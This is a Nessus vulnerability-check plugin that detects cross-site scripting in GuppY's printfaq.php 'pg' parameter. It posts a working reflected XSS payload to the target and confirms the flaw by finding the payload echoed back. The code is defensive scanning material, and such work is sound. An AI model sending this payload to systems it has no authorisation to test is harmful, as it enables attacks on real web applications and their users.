#
# Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#

# Changes by Tenable:
# - Revised plugin title, added CVE ref, added OSVDB refs, changed family (4/30/09)
# - Revised plugin description, added CPE (12/03/12)


include("compat.inc");

if (description) {
  script_id(19942);
  script_version("$Revision: 1.15 $");
  script_cve_id("CVE-2005-2853", "CVE-2005-3156");
  script_bugtraq_id(14752, 14984);
  script_osvdb_id(19242, 19243, 19748);

  script_name(english:"GuppY < 4.5.6a Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to cross-site
scripting and possibly directory traversal attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GuppY / EasyGuppY, a CMS written in PHP. 

The version of Guppy / EasyGuppY installed on the remote host fails to
sanitize user-supplied input to the 'pg' field in the 'printfaq.php'
script.  An attacker can exploit this flaw to launch cross-site
scripting and possibly directory traversal attacks against the affected
application." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Sep/359" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 4.5.6a or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/10/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/06");

 script_cvs_date("$Date: 2016/10/10 15:57:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:guppy:guppy");
script_end_attributes();

 
  script_summary(english:"Checks for pg parameter flaw in Guppy");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"(C) 2005-2016 Josh Zlatin-Amishav");
  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);

foreach dir ( cgi_dirs() )
{
  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/printfaq.php?lng=en&pg=1"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does and looks like GuppY...
  if ("<title>GuppY - " >< res) {
    # Try to exploit the flaw.
    #
    # nb: we'll use a POST since 4.5.5 prevents GETs from working but
    #     still allows us to pass data via POSTs and cookies. Also, we
    #     check for the XSS rather than try to read an arbitrary file
    #     since the latter doesn't work with 4.5.5 except under Windows.
    postdata = string(
      'pg=', exss
    );
    req = string(
      "POST /", dir, "/printfaq.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);
    
    if ( xss >< res )
    {
        security_warning(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
    }
  }
}
